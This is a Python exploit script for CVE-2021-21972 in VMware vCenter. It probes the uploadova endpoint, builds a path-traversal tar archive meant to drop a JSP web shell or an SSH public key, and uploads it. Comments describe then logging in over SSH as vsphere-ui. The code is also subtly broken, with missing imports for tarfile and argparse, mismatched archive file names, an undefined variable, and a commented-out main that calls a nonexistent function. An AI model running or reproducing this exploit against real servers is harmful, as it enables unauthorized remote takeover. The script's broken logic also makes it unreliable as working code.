import requests
import os
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
vuln_url= '/ui/vropspluginui/rest/services/uploadova'
##check weather the target is vulnerable or not
def check_vuln(ip):
    r=requests.get("https://"+ip+vuln_url,verify=False, timeout=30)             ## send get request for post method
    if r.status_code==405:  ## the surver knows the request method but the target resource does not support this method
        print("the target with ip" +ip+ "is vulnerable to CVE-2021-21972")
        return True
    else:
        print("the target with ip" +ip+ "is not vulnerable to CVE-2021-21972")
        return False
##path traversal charater for win and linux
def os_specific_path(path,depth,os="win"):
    if os=="win":
        fullpath="..\\"*depth+path
        return fullpath.replace('/', '\\').replace('\\\\', '\\')
    else:
        fullpath="../"*depth+path
        return fullpath.replace('\\', '/').replace('//', '/')
##create archive file which contain the shell jsp and path traversal character
def create_archive(file,path,os):
    archive_file=tarfile.open("test_archive.tar","w")
    full_path=os_specific_path(path,5,os)
    archive_file.add(file,full_path)
    archive_file.close()
    print ("successfully create archive file in local system")

##post created archive file
def file_upload(file,path):
    up=requests.post("https://"+ip+vuln_url,files={'uploadFile':open('exploit.tar', 'rb')},verify=False,timeout=30)
    if up.status_code==200:
        print ("file uploaded successfully ")
    else:
        print("unable to upload the file")
##
# ##in the main
# if __name__ == "__main__":
#     parser = argparse.ArgumentParser()
#     parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
#     parser.add_argument('-f', '--file', help='The file to tar')
#     parser.add_argument('-p', '--path', help='The path to extract the file to on target')
#     parser.add_argument('-o', '--os', help='The operating system of the VCSA server')
#     args = parser.parse_args()
# 
#     vulnerable = check_vuln(args.target)
#     if vulnerable and (args.file and args.path and args.os):
#         create_archive(args.file, args.path, args.os)
#         post(args.target)


# uploadurl="https://ip/ui/vropspluginui/rest/services/uploadova"
# upload_data={"uploadfile":open("filr","rb"),"application/octet-stream"}
# out_response=request.post(uploadurl,files=upload_data,verify=False)
# out_response.satus_code

##
##for ssh publick key post first check port 22 with nmap
##generate publick key using
##ssh-keygen -t rsa
##the upload pub file
##then login with
##ssh vsphare-ui@ip